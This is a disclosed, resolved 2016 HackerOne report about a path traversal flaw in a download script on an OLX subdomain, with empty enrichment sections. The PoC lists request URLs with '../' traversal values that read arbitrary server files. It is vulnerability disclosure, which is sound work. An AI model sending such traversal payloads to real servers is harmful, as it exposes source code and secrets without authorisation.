---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '150783'
original_report_id: '150783'
title: Arbitrary File Reading
team_handle: olx
created_at: '2016-07-12T00:29:37.196Z'
disclosed_at: '2016-08-12T15:30:33.326Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 10
tags:
- hackerone
---

# Arbitrary File Reading

## Metadata

- HackerOne Report ID: 150783
- Weakness: 
- Program: olx
- Disclosed At: 2016-08-12T15:30:33.326Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi!

The script for video downloading doesn't properly filter the input filename, and it's possible to read arbitrary files from File System

PoC

http://makeyourad1.olx.in/converted/final/ready/madeit/download.php?file=download.php
http://makeyourad1.olx.in/converted/final/ready/madeit/download.php?file=../../../../b<<
http://makeyourad1.olx.in/converted/final/ready/madeit/download.php?file=../../../../c<<

screenshots are attached below

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
